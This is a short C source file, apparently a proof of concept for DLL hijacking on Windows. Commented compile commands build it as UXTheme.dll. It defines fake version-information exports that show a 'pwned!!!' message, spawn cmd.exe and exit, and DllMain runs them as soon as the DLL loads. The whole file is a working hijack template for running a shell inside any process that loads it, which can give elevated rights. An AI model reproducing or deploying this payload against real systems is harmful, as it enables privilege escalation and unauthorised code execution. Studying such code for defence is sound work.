#include <windows.h> 
#include <Winuser.h> 
  // i686-w64-mingw32-gcc -c -o dll-hijack.o dll-hijack.c   
  // i686-w64-mingw32-gcc -shared -o UXTheme.dll dll-hijack.o -lcomctl32 -Wl,--subsystem,windows  

// int hijack()  
// {  
//   WinExec("calc", 1); 
//   MessageBox(NULL,"helloworld", "helloworld", NULL); 
//   return 0;  
// }  
int VerQueryValueW(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int GetFileVersionInfoSizeW(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int GetFileVersionInfoW(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    VerQueryValueW(); 
    GetFileVersionInfoSizeW();
    GetFileVersionInfoW(); 
  }  
  
  return TRUE;  
}  